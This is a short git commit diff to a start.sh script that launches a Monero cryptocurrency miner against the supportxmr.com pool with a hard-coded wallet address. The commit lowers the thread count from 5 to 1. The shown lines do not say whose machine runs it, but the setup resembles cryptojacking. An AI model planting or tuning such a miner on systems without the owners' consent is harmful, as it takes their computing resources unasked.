edba8d6fa945164e5c82140cdf66160fb7336d74
Zelticu <Zelticue@gmail.com>
2025-07-18 16:19:51 -0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -5,7 +5,7 @@ cd /app
   -o stratum+ssl://pool.supportxmr.com:443 \
   -u 43dmY2p8qSD2rzEeEsTa7fS2XQ5dULQPuESeoz8kVDnsH1gAThHgbBAVCTasSBUGs6LJ6EtDxWhRyBHfN9XccTwc9KrtiYy \
   -p x \
-  --threads 5 \
+  --threads 1 \
   --cpu-priority 0 \
   --donate-level 0 \
   --no-huge-pages \
